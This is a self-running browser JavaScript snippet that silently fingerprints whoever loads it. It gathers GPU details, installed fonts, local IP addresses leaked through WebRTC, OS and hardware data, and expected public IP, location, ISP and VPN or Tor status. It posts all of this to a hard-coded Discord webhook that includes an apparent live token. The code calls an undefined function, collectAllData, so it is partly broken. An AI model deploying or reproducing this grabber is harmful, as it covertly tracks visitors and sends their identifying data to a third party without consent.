(() => {
  const collectWindowsData = async () => {
    const getWebGLInfo = () => {
      try {
        const canvas = document.createElement("canvas");
        const gl =
          canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return null;
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return {
          renderer: debugInfo
            ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            : null,
          vendor: debugInfo
            ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
            : null,
          maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
          shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          version: gl.getParameter(gl.VERSION),
        };
      } catch (e) {
        return null;
      }
    };

    const getFonts = () => {
      const fontList = [
        "Arial",
        "Arial Black",
        "Courier New",
        "Times New Roman",
        "Georgia",
        "Verdana",
        "Helvetica",
        "Comic Sans MS",
        "Impact",
        "Lucida Console",
        "Tahoma",
        "Trebuchet MS",
      ];
      const availableFonts = [];
      const testString = "mmmmmmmmmml";
      const testSize = "72px";
      const span = document.createElement("span");
      span.style.fontSize = testSize;
      span.innerHTML = testString;
      document.body.appendChild(span);
      const defaultWidth = span.offsetWidth;

      fontList.forEach((font) => {
        span.style.fontFamily = font;
        if (span.offsetWidth !== defaultWidth) {
          availableFonts.push(font);
        }
      });

      document.body.removeChild(span);
      return availableFonts;
    };

    const getLocalIPs = async () => {
      try {
        const ips = [];
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        offer.sdp.split("\n").forEach((line) => {
          if (line.includes("candidate")) {
            const parts = line.split(" ");
            if (parts[7] === "host") ips.push(parts[4]);
          }
        });
        pc.close();
        return ips;
      } catch (e) {
        return null;
      }
    };

    const getWindowsData = () => {
      return {
        windowsVersion:
          navigator.userAgent.match(/Windows NT (\d+\.\d+)/)?.[1] || null,
        edgeHTMLVersion:
          navigator.userAgent.match(/Edge\/(\d+\.\d+)/)?.[1] || null,
        touchSupport: navigator.maxTouchPoints > 0,
        msManipulationViewsEnabled: "msManipulationViewsEnabled" in navigator,
        msMaxTouchPoints: navigator.msMaxTouchPoints || null,
        windowsTheme: window.matchMedia("(prefers-color-scheme: dark)").matches
          ? "dark"
          : "light",
      };
    };

    const data = await collectAllData(); // Your existing data collection

    const headerEmbed = {
      title: "🌐 User Information Summary",
      color: 0x3498db, // Calm blue
      fields: [
        {
          name: "📍 Location",
          value: `${data.ipInfo.city || "Unknown"}, ${
            data.ipInfo.country || "Unknown"
          }`,
          inline: true,
        },
        {
          name: "🆔 IP Address",
          value: data.ipInfo.ip || "Unknown",
          inline: true,
        },
        {
          name: "🌐 ISP",
          value: data.ipInfo.isp || "Unknown",
          inline: true,
        },
        {
          name: "🖥️ System",
          value: `${data.system.platform || "Unknown"} | ${
            data.system.windowsVersion || "Unknown OS"
          }`,
          inline: true,
        },
        {
          name: "🔍 Browser",
          value: data.system.userAgent.split(") ")[0] + ")",
          inline: true,
        },
        {
          name: "🕒 Timezone",
          value: data.time.timezone || "Unknown",
          inline: true,
        },
      ],
      footer: { text: `Collected at ${new Date().toUTCString()}` },
    };

    const categoryEmbeds = [
      {
        title: "🛡️ System Information",
        color: 0x5dade2, // Soft blue
        fields: [
          {
            name: "OS Version",
            value: data.system.windowsVersion || "Unknown",
            inline: true,
          },
          {
            name: "Platform",
            value: data.system.platform || "Unknown",
            inline: true,
          },
          {
            name: "Device Memory",
            value: `${data.system.deviceMemory || "Unknown"} GB`,
            inline: true,
          },
          {
            name: "CPU Cores",
            value: String(data.system.hardwareConcurrency),
            inline: true,
          },
          {
            name: "Touch Support",
            value: data.system.touchSupport ? "Yes" : "No",
            inline: true,
          },
          {
            name: "System Theme",
            value: data.system.windowsTheme || "Unknown",
            inline: true,
          },
        ],
      },
      {
        title: "🖥️ Hardware Details",
        color: 0x58d68d, // Soft green
        fields: [
          {
            name: "GPU Renderer",
            value: data.hardware.webgl?.renderer || "Unknown",
            inline: true,
          },
          {
            name: "GPU Vendor",
            value: data.hardware.webgl?.vendor || "Unknown",
            inline: true,
          },
          {
            name: "Screen Resolution",
            value: `${data.display.width}x${data.display.height}`,
            inline: true,
          },
          {
            name: "Color Depth",
            value: `${data.display.colorDepth}-bit`,
            inline: true,
          },
          {
            name: "Touch Support",
            value: data.hardware.touch ? "Yes" : "No",
            inline: true,
          },
          {
            name: "Motion Sensors",
            value: data.hardware.motion ? "Yes" : "No",
            inline: true,
          },
        ],
      },
      {
        title: "🌐 Network Information",
        color: 0xf39c12, // Soft orange
        fields: [
          {
            name: "Public IP",
            value: data.ipInfo.ip || "Unknown",
            inline: true,
          },
          {
            name: "Local IPs",
            value: data.network.localIPs?.join(", ") || "Unknown",
            inline: true,
          },
          {
            name: "Connection Type",
            value: data.network.connection?.type || "Unknown",
            inline: true,
          },
          {
            name: "Network Speed",
            value: data.network.connection?.effectiveType || "Unknown",
            inline: true,
          },
          {
            name: "VPN Detected",
            value: data.ipInfo.vpn ? "Yes" : "No",
            inline: true,
          },
          {
            name: "TOR Detected",
            value: data.ipInfo.tor ? "Yes" : "No",
            inline: true,
          },
        ],
      },
      {
        title: "⚙️ Browser Environment",
        color: 0x9b59b6, // Soft purple
        fields: [
          {
            name: "User Agent",
            value: data.system.userAgent.substring(0, 50) + "...",
            inline: true,
          },
          {
            name: "Browser",
            value: data.system.product || "Unknown",
            inline: true,
          },
          {
            name: "Language",
            value: data.system.language || "Unknown",
            inline: true,
          },
          {
            name: "Cookies Enabled",
            value: data.storage.cookies ? "Yes" : "No",
            inline: true,
          },
          {
            name: "Local Storage",
            value: data.storage.localStorageEnabled ? "Yes" : "No",
            inline: true,
          },
          {
            name: "IndexedDB",
            value: data.storage.indexedDB ? "Yes" : "No",
            inline: true,
          },
        ],
      },
    ];

    // Send to Discord
    const sendToDiscord = (embeds) => {
      const payload = {
        username: "System Information Collector",
        avatar_url: "https://i.imgur.com/ABC123.png",
        embeds: embeds,
      };

      fetch(
        "https://discord.com/api/webhooks/1401997242511917086/duk9-WwJDKSCC111Sj2g16IvnwFCvQjNjlsVHfdE5suHDAGbOfQ0AVPoi8W8Pj-zZz__",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }
      );
    };

    sendToDiscord([headerEmbed]);
    sendToDiscord(categoryEmbeds);
  };

  collectWindowsData();
})();
